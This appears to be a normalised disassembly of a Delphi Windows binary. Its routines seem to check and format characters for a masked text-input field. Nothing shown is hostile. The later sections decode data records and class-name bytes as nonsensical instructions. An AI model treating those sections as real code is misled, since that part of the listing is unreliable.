mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
pop ecx
pop edx
pop ebx
retn
sub_465b7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push edi
mov cl [ ebx + 0x224 ]
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_4634f8
push edi
mov cl 0x20
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_4634f8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_465bc4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465d8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov eax esi
mov edx ebx
call sub_404480
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_4046e4
mov ebx eax
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx 0x1
call sub_46345c
mov ebx eax
test bl 0x1
je r-xdata
mov edi 0x1
mov eax [ esi ]
call sub_4046e4
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov [ ebp - 0xc ] 0x1
mov eax [ esi ]
call sub_4046e4
mov ebx eax
test ebx ebx
jle r-xdata
mov al [ ebp - 0xd ]
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ esi ]
call sub_4046e4
mov ecx eax
sub ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
inc edx
mov eax [ esi ]
call sub_40493c
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0xc ]
dec ecx
mov eax [ esi ]
mov edx 0x1
call sub_40493c
mov edx [ ebp - 0x18 ]
mov eax esi
pop ecx
call sub_404730
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x224 ] 0x20
je r-xdata
mov edi 0x1
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov edi 0x1
inc edi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465d91
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404450
retn
mov eax [ esi ]
call sub_4046e4
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ esi ]
call sub_4046e4
mov edx eax
dec edx
mov eax esi
call sub_404a68
inc edi
dec ebx
jne r-xdata
push esi
mov eax [ esi ]
call sub_4046e4
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ esi ]
mov edx [ ebp - 0xc ]
call sub_40493c
jmp r-xdata
inc [ ebp - 0xc ]
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx edi
call sub_463308
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
dec eax
sub al 0x2
jae r-xdata
mov edi 0x1
mov eax [ ebp - 0x8 ]
sub eax edi
mov edx [ esi ]
mov al [ edx + eax ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov eax esi
call j_sub_4048e8#2
mov [ eax + edi - 0x1 ] 0x20
inc edi
dec ebx
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
sub_465d98
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov bl 0x1
cmp [ esi + 0x220 ] 0x0
je r-xdata
test bl bl
jne r-xdata
xor ebx ebx
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4638e4
mov edi eax
test edi edi
jl r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
call MessageBeep
mov edx edi
mov eax [ esi + 0x220 ]
call sub_463308
mov [ esp ] al
mov al [ ebp ]
mov [ esp + 0x1 ] al
mov edx ebp
mov ecx edi
mov eax esi
call sub_465f2c
mov ebx eax
test bl bl
jne r-xdata
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
mov cl [ esp + 0x1 ]
mov edx edi
mov eax esi
call sub_46660c
mov edi eax
test edi edi
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_463890
mov edi eax
mov edx edi
mov eax esi
call sub_464fd4
jmp r-xdata
sub_465e4c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_465f1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_463890
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_4046e4
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jle r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax - 0x1 ]
call sub_402a88
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax ]
call sub_402a88
pop edx
cmp dl al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_464aec
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_40c81c
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ esi ]
call sub_464aec
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x1 ]
call sub_40c81c
cmp al 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465f21
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
sub_465f2c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4661de
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_463308
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_46345c
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
movzx eax [ eax + edx - 0x1 ]
cmp eax 0x43
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
call sub_4634d8
mov [ ebx ] al
jmp r-xdata
sub eax 0x4c
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4661e5
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_404450
retn
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x15
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x23
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4044c4
lea eax [ ebp - 0x10 ]
call j_sub_4048e8#2
mov dl [ ebx ]
mov [ eax ] dl
mov al [ ebx ]
call sub_465e34
test al al
je r-xdata
push ebp
mov al [ ebx ]
call sub_465e4c
pop ecx
test al al
je r-xdata
sub eax 0x2
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
je r-xdata
push ebp
mov al [ ebx ]
call sub_465e4c
pop ecx
test al al
je r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0xd
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub eax 0x9
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4044c4
lea eax [ ebp - 0x10 ]
call j_sub_4048e8#2
mov dl [ ebx ]
mov [ eax ] dl
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x20
je r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0x9
je r-xdata
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x41
je r-xdata
jmp r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_408760
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_4044c4
jmp r-xdata
cmp [ ebx ] 0x2b
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
sub eax 0x8
je r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_408760
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_4044c4
jmp r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaNumericA
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x61
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_408794
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
call sub_4044c4
cmp [ ebx ] 0x2d
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_408794
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_4044c4
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_4661f3
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov [ esp + 0x8 ] 0x1
mov [ esp + 0xc ] 0x1
mov eax [ ebp + 0x220 ]
call sub_4046e4
mov esi eax
test esi esi
jle r-xdata
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc edi
dec esi
jne r-xdata
cmp bl 0x4
jne r-xdata
mov eax [ ebp + 0x220 ]
mov edx edi
call sub_463308
mov ebx eax
mov eax ebx
dec eax
sub al 0x2
jb r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp + 0x224 ]
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0xc ]
dec eax
mov edx [ esp + 0x4 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
inc [ esp + 0xc ]
mov eax [ ebp + 0x220 ]
cmp [ eax + edi - 0x1 ] 0x43
je r-xdata
sub_4662b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test eax eax
je r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x8 ]
inc ebx
add eax ebx
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_4638e4
mov esi eax
test esi esi
jl r-xdata
mov eax [ edi + 0x220 ]
call sub_4046e4
sub eax esi
jl r-xdata
inc eax
xchg esi eax
mov [ ebp - 0x14 ] eax
add al 0xfc
sub al 0x2
jae r-xdata
inc ebx
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call j_sub_4048e8#2
mov dl [ edi + 0x224 ]
mov [ eax + ebx - 0x1 ] dl
inc ebx
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x14 ]
call sub_463308
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
sub_466348
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4665f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4665ff
lea eax [ ebp - 0x34 ]
mov edx 0x8
call sub_404450
lea eax [ ebp - 0x10 ]
call sub_40442c
retn
mov ebx 0x1
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_4044c4
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x220 ]
call sub_4638e4
mov edi eax
test edi edi
jl r-xdata
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_4046e4
cmp edi eax
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_463308
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x10 ]
call sub_4046e4
add eax [ ebp + 0x8 ]
cmp eax [ esi + 0x228 ]
jge r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
mov [ ebp - 0x11 ] al
lea edx [ ebp - 0x11 ]
mov ecx edi
mov eax esi
call sub_465f2c
test al al
jne r-xdata
dec eax
sub al 0x2
jae r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_40c81c
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_4046e4
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40c81c
cmp al 0x2
jne r-xdata
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax ebx
cmp eax [ esi + 0x228 ]
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ esi + 0x228 ]
sub ecx edi
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_40493c
mov eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_40493c
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
pop ecx
call sub_404730
inc edi
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_40493c
push [ ebp - 0x28 ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4046e4
add eax [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx eax
push edx
mov eax [ ebp - 0x10 ]
call sub_4046e4
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
pop ecx
call sub_40493c
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4047a4
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov dl [ esi + 0x224 ]
call sub_40460c
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_4046ec
inc ebx
lea eax [ ebp - 0x10 ]
call j_sub_4048e8#2
mov dl [ ebp - 0x11 ]
mov [ eax + ebx - 0x1 ] dl
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
mov al [ esi + 0x224 ]
mov [ ebp - 0x11 ] al
lea eax [ ebp - 0x10 ]
call j_sub_4048e8#2
mov dl [ esi + 0x224 ]
mov [ eax + ebx ] dl
mov eax [ ebp - 0x10 ]
call sub_4046e4
cmp eax ebx
jl r-xdata
add ebx [ ebp + 0x8 ]
dec ebx
mov [ ebp - 0x8 ] ebx
inc ebx
inc ebx
inc edi
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_40493c
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0x11 ]
call sub_40460c
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4046e4
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_40493c
push [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4047a4
inc edi
sub_46660c
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
or ebp 0xffffffff
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_4046e4
cmp edi eax
jl r-xdata
inc edi
mov edx edi
mov eax [ esi + 0x220 ]
call sub_463308
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x220 ]
mov dl [ edx + edi - 0x1 ]
cmp al 0x2
jne r-xdata
cmp bl dl
jne r-xdata
mov eax edx
call sub_4634d8
mov edx eax
mov ebp edi
jmp r-xdata
sub_466668
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46668d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466694
retn
sub_466730
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_466755
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46675c
retn
sub_46687c
clc
add [ esi ] 0x18
test [ esi ] al
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6e6f4374
jbe r-xdata
push 0x2800416b
jpo r-xdata
cwde
push 0xe070046
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6e6f4374
jbe r-xdata
add al al
add [ eax ] al
add [ edx ] al
add bh ch
add [ edx + ebp * 2 + 0x7b780041 ] al
inc esi
add [ eax ] bh
test [ esi ] al
add al 0xe6
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax + 0xe00467a ] ah
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
xor al 0x0
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
rol [ eax ] 0x0
add [ eax - 0x80000000 ] al
add al [ eax ]
adc dl [ ebx + 0x65 ]
jb r-xdata
push 0x49600046
inc ecx
add [ ecx ] cl
add [ esi ] al
inc esp
dec ebp
popad
outsb
pop es
add [ eax + edx + 0xc00040 ] ch
add bh bh
rol [ eax ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53120002 ] al
jb r-xdata
arpl [ ebp + ecx * 2 + 0x6f ] si
add [ gs : eax ] dl
inc eax
add bh al
add [ eax ] al
[ eax + 0x1004683 ]
imul esp [ ebx + 0x65 ] 0x6c707041
imul esp [ ebx + 0x61 ] 0x6e6f6974
lodsb [ esi ]
adc [ eax ] al
xor [ eax ] al
add bh bh
enter 0x4683 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
or al [ esp + 0x65 ]
push ebx
jb r-xdata
mov al 0x0
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ edi ] al
dec edi
outsb
inc ebx
insb
outsd
jae r-xdata
imul esp [ ebx + 0x65 ] r-xdata
xor al 0x0
add bh bh
int3
add [ esi + esi + 0x40 ] dh
add al dh
test [ esi ] al
push 0x1c00416b
in eax 0x41
add [ edx + ebp * 2 - 0x1a0bffbf ] al
inc ecx
add [ esi + eax * 4 ] al
inc esi
add [ esi ] al
inc ecx
push esp
xor al 0x41
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060008 ] al
outsb
dec edi
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ eax ] cl
dec edi
outsb
inc ebx
push 0x65676e61
lea eax [ eax ]
jl r-xdata
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esp + eax * 4 + 0xe0046 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
lea eax [ eax ]
push 0x46
add [ edi ] al
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
or al 0x6a
inc esi
add [ eax + 0x49 ] ah
inc ecx
add [ edi ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add eax 0x4010ac00
add [ eax - 0x4bffb97a ] cl
xchg [ esi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x54
js r-xdata
outsb
nop
or al 0x6a
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 2 ] bh
inc esi
add [ edx + ebp * 2 + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x6a ] cl
inc esi
add [ eax ] cl
add [ eax ] al
dec eax
inc ecx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
out 0x41 al
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax ] ah
lea eax [ esi ]
add al [ eax ]
out dx eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
imul eax [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 2 + 0x6bba0046 ] ch
inc esi
add [ eax ] cl
add [ eax ] al
dec eax
inc ecx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ ebp + ecx * 4 + 0x46 ] ah
add [ eax + 0x6b ] ch
inc ecx
add [ 0x6a840041 ] bl
inc ecx
add ah dh
in eax 0x41
add al al
in al 0x41
add [ esi ] al
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
sub_466c1c
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
pop es
dec edi
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x6800468a ] ah
imul eax [ ecx ] 0x1c
in eax 0x41
add [ edx + ebp * 2 - 0x1a0bffbf ] al
inc ecx
movsb [ edi ] [ esi ]
inc esi
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0004 ] al
outsb
inc ebp
js r-xdata
add al bh
mov [ esi ] es
add al 0xe6
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ edx + ecx * 4 + 0x46 ] dl
add [ ecx ] al
add bh ch
jmp esp
arpl [ ebp + 0x74 ] si
dec ebp
popad
arpl [ edx + 0x6f ] si
nop
lodsb [ esi ]
insb
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
insb
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
insb
inc esi
add ah ah
insb
inc esi
add [ eax + eax ] cl
add [ eax + ecx * 2 + 0x41 ] ah
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
sub_466dcc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
outsb
inc esi
add [ esi + ebp * 2 + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x6e ] dl
inc esi
add [ eax + eax ] cl
add [ eax + ecx * 2 + 0x41 ] ah
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ esi * 2 + 0x6b680046 ] cl
inc ecx
add [ 0x6a840041 ] bl
inc ecx
add ah dh
in eax 0x41
add al al
in al 0x41
add [ esi ] al
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esp + esi * 2 ] ch
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] ch
add [ eax ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
shl [ esi + ebp * 2 + 0x46 ] 0x0
pop es
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
outsb
inc esi
add [ eax + eax ] cl
add [ eax ] al
push esp
jns r-xdata
outsb
inc esi
add [ eax + 0x49 ] ah
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x6f ] ah
inc esi
add [ eax ] al
add [ eax ] al
dec eax
inc ecx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
